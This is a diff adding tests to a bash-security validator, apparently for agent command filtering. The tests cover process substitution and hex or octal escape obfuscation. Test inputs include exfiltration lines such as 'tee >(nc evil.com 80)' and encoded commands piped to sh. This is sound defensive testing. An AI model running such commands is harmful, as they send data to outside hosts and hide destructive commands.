@@ -31,6 +31,8 @@ import {
   detectPackageManagerHijack,
   detectNetworkManipulation,
   detectDataExfiltration,
+  detectEscapeObfuscation,
+  validateProcessSubstitution,
 } from '../src/tools/bash-security';
 
 // ---------------------------------------------------------------------------
@@ -2757,5 +2759,365 @@ describe('validateBashSecurity data exfiltration integration', () => {
 
   it('allows curl -o output.json api.example.com via validateBashSecurity', () => {
     assert.equal(validateBashSecurity('curl -o output.json api.example.com').safe, true);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// validateProcessSubstitution
+// ---------------------------------------------------------------------------
+
+describe('validateProcessSubstitution', () => {
+  // --- blocks process substitution patterns ---
+
+  it('blocks input process substitution <(cmd)', () => {
+    const r = validateProcessSubstitution('diff <(sort file1) <(sort file2)');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PROCESS_SUBSTITUTION);
+  });
+
+  it('blocks output process substitution >(cmd)', () => {
+    const r = validateProcessSubstitution('tee >(grep error > errors.log)');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PROCESS_SUBSTITUTION);
+  });
+
+  it('blocks output redirection to process substitution > >(cmd)', () => {
+    const r = validateProcessSubstitution('cat file > >(exfil_cmd)');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PROCESS_SUBSTITUTION);
+  });
+
+  it('blocks tee with process substitution exfiltration', () => {
+    const r = validateProcessSubstitution('tee >(nc evil.com 80)');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PROCESS_SUBSTITUTION);
+  });
+
+  it('blocks input process substitution as file argument', () => {
+    const r = validateProcessSubstitution('cat <(echo secret)');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PROCESS_SUBSTITUTION);
+  });
+
+  it('blocks stdout redirect to process substitution with network exfil', () => {
+    const r = validateProcessSubstitution('echo hello > >(nc evil.com 80)');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PROCESS_SUBSTITUTION);
+  });
+
+  it('blocks multiple process substitutions', () => {
+    const r = validateProcessSubstitution('paste <(cut -f1 a) <(cut -f2 b)');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PROCESS_SUBSTITUTION);
+  });
+
+  // --- allows safe commands ---
+
+  it('allows plain commands without process substitution', () => {
+    assert.equal(validateProcessSubstitution('ls -la').safe, true);
+  });
+
+  it('allows echo with parentheses (not process substitution)', () => {
+    assert.equal(validateProcessSubstitution('echo (hello)').safe, true);
+  });
+
+  it('allows git log', () => {
+    assert.equal(validateProcessSubstitution('git log --oneline').safe, true);
+  });
+
+  it('allows grep with no process substitution', () => {
+    assert.equal(validateProcessSubstitution('grep -r pattern src/').safe, true);
+  });
+
+  it('allows normal file redirection', () => {
+    assert.equal(validateProcessSubstitution('echo hello > file.txt').safe, true);
+  });
+});
+
+describe('validateBashSecurity process substitution integration', () => {
+  it('blocks process substitution in detached mode (redirect check skipped)', () => {
+    const r = validateBashSecurity('tee >(nc evil.com 80)', { detachedMode: true });
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PROCESS_SUBSTITUTION);
+  });
+
+  it('blocks output process substitution redirect in detached mode', () => {
+    const r = validateBashSecurity('cat file > >(exfil)', { detachedMode: true });
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PROCESS_SUBSTITUTION);
+  });
+
+  it('blocks input process substitution in detached mode', () => {
+    const r = validateBashSecurity('diff <(cmd1) <(cmd2)', { detachedMode: true });
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PROCESS_SUBSTITUTION);
+  });
+
+  it('blocks process substitution in normal mode (caught by earlier check)', () => {
+    const r = validateBashSecurity('tee >(malicious)');
+    assert.equal(r.safe, false);
+    // In normal mode, validateRedirections (check 32) fires first
+  });
+});
+
+// ---------------------------------------------------------------------------
+// detectEscapeObfuscation
+// ---------------------------------------------------------------------------
+
+describe('detectEscapeObfuscation', () => {
+  // --- echo -e with hex escapes ---
+
+  it('blocks echo -e with hex escapes reconstructing "rm"', () => {
+    const r = detectEscapeObfuscation("echo -e '\\x72\\x6d'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'rm'"));
+  });
+
+  it('blocks echo -e with hex escapes reconstructing "curl"', () => {
+    const r = detectEscapeObfuscation('echo -e "\\x63\\x75\\x72\\x6c"');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'curl'"));
+  });
+
+  it('blocks echo -e with hex escapes reconstructing "wget"', () => {
+    const r = detectEscapeObfuscation("echo -e '\\x77\\x67\\x65\\x74'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'wget'"));
+  });
+
+  it('blocks echo -e with hex escapes reconstructing "sudo"', () => {
+    const r = detectEscapeObfuscation("echo -e '\\x73\\x75\\x64\\x6f'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'sudo'"));
+  });
+
+  it('blocks echo -e with hex escapes reconstructing "nc"', () => {
+    const r = detectEscapeObfuscation("echo -e '\\x6e\\x63'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'nc'"));
+  });
+
+  it('blocks echo -e with hex escapes reconstructing "dd"', () => {
+    const r = detectEscapeObfuscation("echo -e '\\x64\\x64'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'dd'"));
+  });
+
+  it('blocks echo -e with hex escapes reconstructing "chmod"', () => {
+    const r = detectEscapeObfuscation("echo -e '\\x63\\x68\\x6d\\x6f\\x64'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'chmod'"));
+  });
+
+  it('blocks echo -e with hex escapes reconstructing "chown"', () => {
+    const r = detectEscapeObfuscation("echo -e '\\x63\\x68\\x6f\\x77\\x6e'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'chown'"));
+  });
+
+  it('blocks echo -e with hex escapes reconstructing "mkfs"', () => {
+    const r = detectEscapeObfuscation("echo -e '\\x6d\\x6b\\x66\\x73'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'mkfs'"));
+  });
+
+  it('blocks echo -e with hex escapes reconstructing "fdisk"', () => {
+    const r = detectEscapeObfuscation("echo -e '\\x66\\x64\\x69\\x73\\x6b'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'fdisk'"));
+  });
+
+  it('blocks echo -e with hex escapes reconstructing "mount"', () => {
+    const r = detectEscapeObfuscation("echo -e '\\x6d\\x6f\\x75\\x6e\\x74'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'mount'"));
+  });
+
+  it('blocks echo -e with hex escapes reconstructing "ncat"', () => {
+    const r = detectEscapeObfuscation("echo -e '\\x6e\\x63\\x61\\x74'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'ncat'"));
+  });
+
+  it('blocks echo -en with hex escapes (combined flags)', () => {
+    const r = detectEscapeObfuscation("echo -en '\\x72\\x6d'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'rm'"));
+  });
+
+  it('blocks echo -ne with hex escapes (reversed flag order)', () => {
+    const r = detectEscapeObfuscation("echo -ne '\\x72\\x6d'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'rm'"));
+  });
+
+  // --- printf with hex escapes ---
+
+  it('blocks printf with hex escapes reconstructing "rm"', () => {
+    const r = detectEscapeObfuscation("printf '\\x72\\x6d'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'rm'"));
+  });
+
+  it('blocks printf with hex escapes reconstructing "curl"', () => {
+    const r = detectEscapeObfuscation("printf '\\x63\\x75\\x72\\x6c'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'curl'"));
+  });
+
+  // --- printf with octal escapes ---
+
+  it('blocks printf with octal escapes reconstructing "rm"', () => {
+    const r = detectEscapeObfuscation("printf '\\162\\155'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'rm'"));
+  });
+
+  it('blocks printf with octal escapes reconstructing "curl"', () => {
+    // c=143, u=165, r=162, l=154
+    const r = detectEscapeObfuscation("printf '\\143\\165\\162\\154'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'curl'"));
+  });
+
+  // --- echo -e with octal escapes ---
+
+  it('blocks echo -e with octal escapes reconstructing "rm"', () => {
+    const r = detectEscapeObfuscation("echo -e '\\162\\155'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'rm'"));
+  });
+
+  // --- ANSI-C quote ($'...') with hex escapes ---
+
+  it('blocks $\'\\xHH\' ANSI-C hex escapes reconstructing "rm"', () => {
+    const r = detectEscapeObfuscation("$'\\x72\\x6d'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'rm'"));
+  });
+
+  it('blocks $\'\\xHH\' ANSI-C hex escapes reconstructing "curl"', () => {
+    const r = detectEscapeObfuscation("$'\\x63\\x75\\x72\\x6c'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'curl'"));
+  });
+
+  it('blocks $\'\\NNN\' ANSI-C octal escapes reconstructing "rm"', () => {
+    const r = detectEscapeObfuscation("$'\\162\\155'");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes("'rm'"));
+  });
+
+  // --- Piped to shell ---
+
+  it('blocks echo -e with hex escapes piped to sh (caught by decode check)', () => {
+    // This is caught by the hex decode check first (rm is a blocked command)
+    const r = detectEscapeObfuscation("echo -e '\\x72\\x6d' | sh");
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks echo -e with hex escapes piped to bash (caught by decode check)', () => {
+    const r = detectEscapeObfuscation("echo -e '\\x72\\x6d' | bash");
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks echo -e with harmless hex escapes piped to sh (pipe check)', () => {
+    // Hello is not a blocked command, but piping any hex escapes to shell is blocked
+    const r = detectEscapeObfuscation("echo -e '\\x48\\x65\\x6c\\x6c\\x6f' | sh");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('piped to shell'));
+  });
+
+  it('blocks printf with harmless hex escapes piped to bash (pipe check)', () => {
+    const r = detectEscapeObfuscation("printf '\\x48\\x65\\x6c\\x6c\\x6f' | bash");
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('piped to shell'));
+  });
+
+  it('blocks printf with octal escapes piped to sh', () => {
+    // rm in octal is caught by the decode check first
+    const r = detectEscapeObfuscation("printf '\\162\\155' | sh");
+    assert.equal(r.blocked, true);
+  });
+
+  // --- Allowed patterns ---
+
+  it('allows echo -e with normal formatting escapes (\\n, \\t)', () => {
+    const r = detectEscapeObfuscation("echo -e '\\n\\t'");
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows echo -e with color codes', () => {
+    const r = detectEscapeObfuscation("echo -e '\\033[31mred\\033[0m'");
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows printf with normal format specifiers', () => {
+    const r = detectEscapeObfuscation("printf '%s\\n' \"hello\"");
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows printf with no escapes', () => {
+    const r = detectEscapeObfuscation("printf 'hello world'");
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows echo -e with hex escapes that decode to "Hello" (not blocked)', () => {
+    // H=48, e=65, l=6c, l=6c, o=6f
+    const r = detectEscapeObfuscation("echo -e '\\x48\\x65\\x6c\\x6c\\x6f'");
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows echo without -e flag (escapes not interpreted)', () => {
+    const r = detectEscapeObfuscation("echo '\\x72\\x6d'");
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows printf with hex escapes that decode to harmless text', () => {
+    // H=48, i=69
+    const r = detectEscapeObfuscation("printf '\\x48\\x69'");
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows $\'\\xHH\' ANSI-C hex with harmless decoded text', () => {
+    // H=48, i=69
+    const r = detectEscapeObfuscation("$'\\x48\\x69'");
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows normal echo without escapes', () => {
+    const r = detectEscapeObfuscation("echo hello world");
+    assert.equal(r.blocked, false);
+  });
+
+  // --- Integration with validateBashSecurity ---
+
+  it('blocks echo -e hex-encoded "rm" via validateBashSecurity', () => {
+    const r = validateBashSecurity("echo -e '\\x72\\x6d'");
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.ESCAPE_OBFUSCATION);
+  });
+
+  it('blocks printf octal-encoded "curl" via validateBashSecurity', () => {
+    // c=143, u=165, r=162, l=154
+    const r = validateBashSecurity("printf '\\143\\165\\162\\154'");
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.ESCAPE_OBFUSCATION);
+  });
+
+  it('blocks echo -e hex piped to sh via validateBashSecurity', () => {
+    const r = validateBashSecurity("echo -e '\\x72\\x6d' | sh");
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.ESCAPE_OBFUSCATION);
+  });
+
+  it('allows echo -e "Hello" hex via validateBashSecurity', () => {
+    const r = validateBashSecurity("echo -e '\\x48\\x65\\x6c\\x6c\\x6f'");
+    assert.equal(r.safe, true);
+  });
+
+  it('allows printf normal usage via validateBashSecurity', () => {
+    const r = validateBashSecurity("printf '%s\\n' \"hello\"");
+    assert.equal(r.safe, true);
   });
 });
